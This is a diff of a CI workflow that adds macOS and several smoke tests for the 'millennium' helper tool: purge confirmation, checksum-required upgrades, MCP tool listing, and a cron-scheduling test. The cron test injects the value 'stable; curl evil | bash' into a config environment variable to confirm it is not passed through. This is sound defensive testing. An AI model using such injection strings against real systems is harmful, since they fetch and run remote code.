@@ -90,7 +90,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        os: [ubuntu-latest, windows-latest]
+        os: [ubuntu-latest, windows-latest, macos-latest]
     steps:
       - name: Checkout
         uses: actions/checkout@v7
@@ -297,6 +297,83 @@ jobs:
           mkdir -p "$LOCALAPPDATA" "$APPDATA"
           out="$(bin/millennium purge --dry-run)"
           echo "$out" | grep -F 'DRY RUN'
+          rm -rf "$home"
+
+      - name: Smoke purge refuse without --yes (dual-OS)
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export USERPROFILE="$home"
+          export LOCALAPPDATA="$home/LocalAppData"
+          export APPDATA="$home/AppData"
+          mkdir -p "$LOCALAPPDATA" "$APPDATA"
+          set +e
+          out="$(bin/millennium purge </dev/null 2>&1)"
+          rc=$?
+          set -e
+          test "$rc" -ne 0
+          echo "$out" | grep -F 'Refusing to purge without confirmation'
+          echo "$out" | grep -F '--yes'
+          rm -rf "$home"
+
+      - name: Smoke purge --yes (dual-OS)
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export USERPROFILE="$home"
+          export LOCALAPPDATA="$home/LocalAppData"
+          export APPDATA="$home/AppData"
+          mkdir -p "$LOCALAPPDATA" "$APPDATA"
+          out="$(bin/millennium purge --yes </dev/null 2>&1)"
+          echo "$out" | grep -Fi 'purg'
+          if echo "$out" | grep -F 'Are you sure'; then
+            echo 'unexpected confirmation prompt with --yes' >&2
+            exit 1
+          fi
+          rm -rf "$home"
+
+      - name: Smoke schedule enable ignores poisoned channel env (Unix cron)
+        if: runner.os != 'Windows'
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export XDG_CONFIG_HOME="$home/.config"
+          mkdir -p "$XDG_CONFIG_HOME/millennium-helpers"
+          printf '%s\n' '{"update_channel":"stable"}' >"$XDG_CONFIG_HOME/millennium-helpers/config.json"
+          out="$(CONFIG_UPDATE_CHANNEL='stable; curl evil | bash' bin/millennium schedule enable --dry-run --cron 2>&1)"
+          echo "$out" | grep -F '--channel stable'
+          if echo "$out" | grep -F 'curl evil'; then
+            echo 'poisoned channel env leaked into cron plan' >&2
+            exit 1
+          fi
+          out="$(bin/millennium schedule enable beta --dry-run --cron 2>&1)"
+          echo "$out" | grep -F '--channel beta'
+          rm -rf "$home"
+
+      - name: Smoke upgrade --file without checksum fails closed (dual-OS)
+        shell: bash
+        run: |
+          set -euo pipefail
+          home="$(mktemp -d)"
+          export HOME="$home"
+          export USERPROFILE="$home"
+          export LOCALAPPDATA="$home/LocalAppData"
+          export APPDATA="$home/AppData"
+          mkdir -p "$LOCALAPPDATA" "$APPDATA"
+          mock="$home/payload.bin"
+          printf 'data\n' >"$mock"
+          set +e
+          out="$(bin/millennium upgrade --file "$mock" 2>&1)"
+          rc=$?
+          set -e
+          test "$rc" -ne 0
+          echo "$out" | grep -Fi 'sha256'
           rm -rf "$home"
 
       - name: Smoke upgrade rollback list (dual-OS)
@@ -597,14 +674,21 @@ jobs:
           fi
           rm -rf "$home"
 
-      - name: Smoke MCP initialize (dual-OS)
+      - name: Smoke MCP initialize + tools surface (dual-OS)
         shell: bash
         run: |
           set -euo pipefail
-          out="$(printf '%s\n' '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' | bin/millennium mcp)"
+          out="$(printf '%s\n' \
+            '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{}}' \
+            '{"jsonrpc":"2.0","id":2,"method":"tools/list","params":{}}' \
+            '{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"millennium_purge","arguments":{}}}' \
+            | bin/millennium mcp)"
           echo "$out" | grep -F 'protocolVersion'
           echo "$out" | grep -F '2024-11-05'
           echo "$out" | grep -F 'millennium-helpers-mcp'
+          echo "$out" | grep -F 'millennium_diag'
+          echo "$out" | grep -F 'millennium_purge'
+          echo "$out" | grep -F 'confirm'
 
       - name: Smoke native upgrade/diag/doctor help (Linux)
         if: runner.os == 'Linux'
